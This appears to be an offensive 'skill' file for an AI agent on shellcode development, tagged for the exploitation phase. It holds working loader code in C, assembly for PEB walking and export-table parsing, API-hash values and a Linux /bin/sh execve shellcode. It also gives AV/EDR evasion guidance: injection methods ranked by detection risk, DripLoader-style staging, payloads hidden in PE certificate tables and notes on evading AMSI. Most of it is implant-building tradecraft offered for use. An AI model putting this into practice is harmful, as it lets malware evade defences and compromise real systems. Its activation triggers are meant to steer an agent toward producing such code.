---
name: shellcode-dev
description: Shellcode development — PIC techniques, PEB walking, API hashing, null-byte avoidance, encoders, loaders, PE-to-shellcode conversion, cross-platform shellcode
metadata:
  type: offensive
  phase: exploitation
  tools: keystone, nasm, msfvenom, donut, srdi, pwntools
---

# Shellcode Development

## When to Activate

- Writing custom x86/x64 shellcode
- Implementing position-independent code (PIC)
- Building shellcode loaders for implant delivery
- Evading AV/EDR static detection
- Converting PE files to shellcode
- Cross-platform shellcode development

## Execution Pattern (Allocate-Write-Execute)

Avoid direct `PAGE_EXECUTE_READWRITE` — prefer two-step:

```c
// 1. Allocate with RW
char *dest = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
// 2. Write shellcode
memcpy(dest, shellcode, size);
// 3. Switch to RX (no write permission)
VirtualProtect(dest, size, PAGE_EXECUTE_READ, &old);
// 4. Execute
((void(*)())dest)();
```

## Position-Independent Code (PIC)

| Method | Platform | Notes |
|--------|----------|-------|
| Call/Pop | Windows | Push next addr, pop into register |
| FPU state (fstenv) | Windows | Saves instruction pointer |
| SEH | Windows | Exception handler stores EIP |
| RIP-relative | x64 | `lea rax, [rip+offset]` |
| GOT | Linux | Global Offset Table |
| VDSO | Linux | Kernel-provided shared object |

## Windows API Resolution (PEB Walk)

```nasm
; x64 PEB walk to find kernel32.dll base
find_kernel32:
    xor rcx, rcx
    mov rax, gs:[rcx + 0x60]       ; RAX = PEB
    mov rax, [rax + 0x18]          ; RAX = PEB->Ldr
    mov rsi, [rax + 0x20]          ; RSI = InMemoryOrderModuleList
    lodsq                           ; skip first entry (exe)
    xchg rax, rsi
    lodsq                           ; skip ntdll
    mov rbx, [rax + 0x20]          ; RBX = kernel32 base address
```

### Export Address Table (EAT) Parsing

```nasm
; Parse EAT to find GetProcAddress
    mov ebx, [rbx + 0x3C]          ; PE signature offset
    add rbx, r8                     ; PE header
    mov edx, [rbx + 0x88]          ; Export Directory RVA
    add rdx, r8                     ; Export Directory VA
    mov r10d, [rdx + 0x14]         ; NumberOfFunctions
    mov r11d, [rdx + 0x20]         ; AddressOfNames RVA
    add r11, r8                     ; AddressOfNames VA
    ; Loop through names, compare hash/string
```

### API Hashing (ROR13)

```python
# Generate hash for API name
def ror13_hash(name):
    hash_val = 0
    for c in name:
        hash_val = ((hash_val >> 13) | (hash_val << 19)) & 0xFFFFFFFF
        hash_val = (hash_val + ord(c)) & 0xFFFFFFFF
    return hash_val

# Common hashes:
# GetProcAddress: 0x7c0dfcaa
# LoadLibraryA:   0xec0e4e8e
# VirtualAlloc:   0x91afca54
# CreateProcessA: 0x863fcc79
```

## Null-Byte Avoidance

| Problem | Solution |
|---------|----------|
| `mov rax, 0` | `xor rax, rax` |
| `mov eax, 0x00000001` | `xor eax, eax; inc eax` |
| String with null terminator | Push string in reverse, use stack pointer |
| `add rsp, 0x200` | `sub rsp, 0xfffffffffffffdf8` (two's complement) |
| Zero in immediate | Use `sub` from known value, or XOR encoding |

## Shellcode Loaders

### Loader Responsibilities
1. Environment verification / keying (sandbox detection)
2. Shellcode decryption (XOR, RC4, AES)
3. Safe memory allocation and injection
4. Execution transfer

### Recommended Languages
- **Zig**: Small binary, no runtime, good for loaders
- **Rust**: Memory-safe, no runtime overhead
- **Nim**: Compiles to C, small binaries
- **Go**: Cross-platform but watch for runtime signatures

### Allocation Strategies

```c
// Two-step allocation (avoid RWX)
LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
memcpy(mem, shellcode, size);
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);

// Alternative: Section mapping
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
NtMapViewOfSection(hSection, GetCurrentProcess(), &localView, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
// Write shellcode to localView
NtMapViewOfSection(hSection, GetCurrentProcess(), &execView, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
// Execute from execView
```

### Evasion Tips for Write Phase
- Prepend shellcode with dummy NOPs/garbage opcodes
- Split into chunks, write in randomized order
- Add random delays between writes
- Use `NtWriteVirtualMemory` instead of `memcpy` for remote injection

### Execution Methods

| Technique | Detection Risk | Notes |
|-----------|---------------|-------|
| CreateRemoteThread | HIGH | Heavily monitored by all EDRs |
| NtQueueApcThreadEx | MEDIUM | APC injection, less monitored |
| NtSetContextThread | MEDIUM | Hijack suspended thread context |
| Callback functions | LOW | VirtualAlloc + EnumWindows callback |
| Fiber execution | LOW | ConvertThreadToFiber + CreateFiber |
| ThreadlessInject | VERY LOW | Overwrite rarely-called export |
| Trampoline (DripLoader) | LOW | JMP to shellcode from ntdll function |

## PE-to-Shellcode Conversion

| Tool | Purpose |
|------|---------|
| [Donut](https://github.com/TheWover/donut) | EXE/DLL/VBS/JS → position-independent shellcode |
| [sRDI](https://github.com/monoxgas/sRDI) | DLL → reflective shellcode |
| [Pe2shc](https://github.com/hasherezade/pe_to_shellcode) | PE → shellcode with custom loader |
| [Amber](https://github.com/EgeBalci/amber) | Reflective PE packer with evasion |

## Shellcode Storage & Hiding

| Location | Risk | Notes |
|----------|------|-------|
| Hardcoded in .text | Medium | Requires recompile |
| PE Resources (RCDATA) | High | Most scanned by AV |
| Certificate Table | Low | Keeps PE signature intact |
| Extra PE section | Medium | Use second-to-last section |
| Internet-hosted | Variable | Downloaded at runtime |
| Registry values | Medium | Stored as binary data |
| Alternate Data Streams | Low | NTFS-specific, less scanned |

### Certificate Table Technique (Recommended)
- Pad Certificate Table with shellcode bytes
- Update PE headers to reflect new size
- Main executable signature remains valid
- Only the loader DLL signature breaks
- Protection: compress (LZMA) + encrypt (AES/RC4/XOR32) before storing

## DripLoader Pattern

```
1. Reserve 64KB chunks with NO_ACCESS
2. Allocate 4KB RW chunks within that pool
3. Write shellcode in chunks in randomized order
4. Re-protect to RX
5. Overwrite prologue of ntdll!RtlpWow64CtxFromAmd64 with JMP trampoline
6. All calls via direct syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx)
```

## Cross-Platform Considerations

### Windows on ARM64 (WoA)
- Syscalls use `SVC 0` with ARM64 syscall table
- Pointer Authentication (PAC) signs LR — avoid stack pivots or re-sign with PACIASP
- Different register conventions (x0-x7 for args, x8 for syscall number)

### Linux x64
```nasm
; execve("/bin/sh", NULL, NULL)
xor rsi, rsi
mul rsi                 ; rax=0, rdx=0
push rsi
mov rdi, 0x68732f2f6e69622f  ; /bin//sh
push rdi
push rsp
pop rdi                 ; rdi = pointer to "/bin//sh"
mov al, 59             ; syscall number for execve
syscall
```

### macOS (Apple Silicon)
- Syscall numbers offset by 0x2000000 (e.g., execve = 0x200003B)
- Code signing enforcement — unsigned code won't execute without entitlements
- Hardened runtime prevents most injection techniques

## Windows 11 24H2 Notes

- AMSI heap scanning active: allocate PAGE_NOACCESS → decrypt in place → PAGE_EXECUTE_READ
- Smart App Control blocks unsigned outbound connections
- Enhanced stack tracing checks full call chain
